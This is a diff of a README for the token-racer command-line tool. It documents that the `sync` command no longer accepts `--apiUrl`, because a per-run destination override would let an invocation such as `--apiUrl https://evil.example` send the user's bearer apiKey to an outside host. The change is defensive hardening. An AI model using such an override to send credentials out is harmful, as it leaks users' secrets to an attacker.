@@ -85,7 +85,7 @@ Nothing stays running between prompts. If the backend is down, nothing is lost: 
 | `token-racer auth show` | Print your keyId + public key. |
 | `token-racer uninstall [--purge]` | Remove the integration. `--purge` also deletes `~/.token-racer/`. |
 
-Every command that talks to the backend (`setup`, `status`, `doctor`, `sync`, `auth`) accepts `--apiUrl <url>` — handy for self-hosters pointing a one-off run at a different backend without touching `~/.token-racer/config.json`.
+`setup`, `status`, `doctor`, and `auth` accept `--apiUrl <url>` for self-hosters pointing at a different backend. `sync` intentionally does **not** accept it — sync attaches your bearer apiKey to every request, and allowing a per-run destination override would turn any `--apiUrl https://evil.example` invocation into an apiKey exfil. Change backends via `setup --apiUrl <url>` instead.
 
 ---
 
